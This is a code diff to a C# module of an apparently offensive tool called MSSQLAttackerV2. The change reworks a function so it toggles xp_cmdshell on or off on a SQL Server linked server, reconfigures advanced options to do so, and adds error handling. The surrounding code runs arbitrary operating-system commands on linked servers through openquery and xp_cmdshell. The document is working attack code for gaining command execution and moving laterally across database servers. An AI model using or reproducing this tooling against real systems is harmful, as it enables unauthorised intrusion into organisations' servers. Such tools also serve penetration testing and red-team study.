@@ -34,38 +34,91 @@ namespace MSSQLAttackerV2.Modules
 
         }
 
-        public bool checkLinkedCmdshell(SqlConnection con, String linkedServer)
+        public int checkLinkedCmdshell(SqlConnection con, String linkedServer)
         {
             var helpWrite = new Helpwrite();
             var runQuery = new RunQuery();
-            String cmdShellValinUse = "select * from openquery(\"" + linkedServer + "\", 'select value_in_use from sys.configurations where name = ''xp_cmdshell''')";
-            String valueInUse = helpWrite.getFilteredResult(runQuery.getQueryResult(con, cmdShellValinUse));
-            if (valueInUse == "1") { helpWrite.doWrite(1, "Linked Server: " + linkedServer + "\t Value In Use: " + valueInUse); return true; }
-            else { helpWrite.doWrite(0, "Linked Server: " + linkedServer + "\t Value In Use: " + valueInUse); return false; }
+            try
+            {
+
+                String cmdShellValinUse = "select * from openquery(\"" + linkedServer + "\", 'select value_in_use from sys.configurations where name = ''xp_cmdshell''')";
+                String valueInUse = helpWrite.getFilteredResult(runQuery.getQueryResult(con, cmdShellValinUse));
+                if (valueInUse == "1") { helpWrite.doWrite(1, "Linked Server: " + linkedServer + "\t Value In Use: " + valueInUse); return 1; }
+                else { helpWrite.doWrite(0, "Linked Server: " + linkedServer + "\t Value In Use: " + valueInUse); return 0; }
+            }
+            catch (Exception)
+            {
+
+                helpWrite.doWrite(0, "Error! || Check Linked Server Name");
+                return 2;
+            }
+
         }
 
-        public void enableLinkedCmdShell(SqlConnection con, [Optional, DefaultParameterValue(null)] String linkedServer)
+        public void toggleLinkedCmdShell(SqlConnection con, [Optional, DefaultParameterValue(null)] String linkedServer)
 
         {
             var helpWrite = new Helpwrite();
             var runQuery = new RunQuery();
+
+
+
             while (string.IsNullOrEmpty(linkedServer))
             {
                 Console.Write("Enter Linked Server: ");
                 linkedServer = Console.ReadLine();
             }
-            if (!checkLinkedCmdshell(con, linkedServer))
+            int value = checkLinkedCmdshell(con, linkedServer);
+            try
             {
+                switch (value)
+                {
+                    case 2:
+                        return;
+                    case 1:
+                        value = 0;
+                        break;
+                    default:
+                        value = 1;
+                        break;
+                }
                 String enableAdvOp = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + linkedServer;
                 String temp = helpWrite.getFilteredResult(runQuery.getQueryResult(con, enableAdvOp));
-                String enableXp_cmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + linkedServer;
+                String enableXp_cmdshell = "EXEC ('sp_configure ''xp_cmdshell'', " + value.ToString() + "; reconfigure;') AT " + linkedServer;
                 temp = helpWrite.getFilteredResult(runQuery.getQueryResult(con, enableXp_cmdshell));
-                if (checkLinkedCmdshell(con, linkedServer)) { helpWrite.doWrite(1, "xp_cmdshell enabled"); }
-                else { helpWrite.doWrite(0, "xp_cmdshell not enabled || check persmissions manually"); }
+
+                switch (value)
+                {
+                    case 1:
+                        if (checkLinkedCmdshell(con, linkedServer) == 1)
+                        {
+                            helpWrite.doWrite(1, "Linked xp_cmdshell toggled");
+                            return;
+
+                        }
+                        helpWrite.doWrite(0, "Linked xp_cmdshell toggle failed");
+                        return;
+                    default:
+                        if (checkLinkedCmdshell(con, linkedServer) == 0)
+                        {
+                            helpWrite.doWrite(1, "Linked xp_cmdshell toggled");
+                            return;
+
+                        }
+                        helpWrite.doWrite(0, "Linked xp_cmdshell toggle failed");
+                        return;
+                }
+
+
             }
-            else { helpWrite.doWrite(1, "xp_cmdshell already enabled"); }
-            return;
+            catch (Exception)
+            {
+                helpWrite.doWrite(0, "Linked xp_cmdshell toggle fail! || Missing Privileges");
+                return;
+            }
+
         }
+
 
         public void linkedServerCmdExec(SqlConnection con, [Optional, DefaultParameterValue(null)] String linkedServer, [Optional, DefaultParameterValue(null)] String command)
         {
@@ -76,7 +129,7 @@ namespace MSSQLAttackerV2.Modules
                 Console.Write("Enter Linked Server: ");
                 linkedServer = Console.ReadLine();
             }
-            if (!checkLinkedCmdshell(con, linkedServer))
+            if (checkLinkedCmdshell(con, linkedServer) == 0)
             {
                 helpWrite.doWrite(0, "xp_cmdshell not enabled");
                 return;
@@ -93,7 +146,7 @@ namespace MSSQLAttackerV2.Modules
                     String cmdString = "select * from openquery(\"" + linkedServer + "\", 'select 1; exec xp_cmdshell ''" + input + "''')";
                     String temp = helpWrite.getFilteredResult(runQuery.getQueryResult(con, cmdString));
                     //Additional Check
-                    if (temp == "1") { helpWrite.doWrite(2, "Command Executed");}
+                    if (temp == "1") { helpWrite.doWrite(2, "Command Executed"); }
                     else { helpWrite.doWrite(0, "Command Execution Failed"); }
                     continue;
                 }
